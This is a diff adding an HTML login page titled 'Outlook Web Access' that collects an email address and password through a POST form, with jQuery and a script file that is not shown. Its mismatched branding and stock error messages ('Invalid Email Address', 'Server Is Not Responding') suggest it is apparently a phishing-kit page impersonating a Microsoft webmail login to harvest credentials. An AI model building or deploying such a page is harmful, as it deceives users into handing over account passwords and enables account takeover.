@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook Web Access</title>
+    <link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <link href="assets/css/aduser.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+    <section class="login-section">
+        <div class="login-logo"></div>
+        <h1 class="login-header">Welcome to your Webmail &amp; Account Settings</h1>
+        <div class="login-tabs">
+            <button class="login-tab login-webmail selected">
+                Webmail
+                <i class="icon-info tooltip tooltipstered"></i>
+            </button>
+            <button class="login-tab login-myservices">
+                My Services
+                <i class="icon-info tooltip tooltipstered"></i>
+            </button>
+        </div>
+    
+        <form method="POST" class="login-form" novalidate="" autocomplete="off">
+            <div>
+                <div id="aduser-login-spinner" style="display: none">
+                    <div style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
+                        <ui:spinner></ui:spinner>
+                    </div>
+                </div>
+                <div class="pr">
+                    <input name="login" id="email" type="text" placeholder="Login (email)"
+                           class="login-input" required="" autofocus="">
+                    <div class="login-validation required">Login required</div>
+                    <div class="login-validation email">Valid e-mail address required</div>
+                </div>
+                <div class="pr">
+                    <input name="password" id="password" type="password" placeholder="Password"
+                           class="password-input" required="">
+                    <div class="password-validation required">Password required</div>
+                </div>
+                <div class="mixed-validation" id="msg" style="display: none;">Your login or password is incorrect.</div>
+                <div class="mixed-validation" id="error" style="display: none;">Invalid Email Address</div>
+                <div class="mixed-validation" id="serror" style="display: none;">Server Is Not Responding</div>
+                <div class="login-actions">
+                    <div class="login-remember">
+                        <label class="login-remember-me">
+                            <input type="checkbox" name="rememberMe" value="true" class="login-checkbox">
+                            <span style="line-height: 22px; height: 22px;">Remember me</span>
+                        </label>
+                    </div>
+                    <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
+                </div>
+            </div>
+            <button type="submit" class="login-submit" id="submit-btn">
+                Login
+            </button>
+        </form>
+    </section>
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/script.js"></script>
+</body>
+</html>
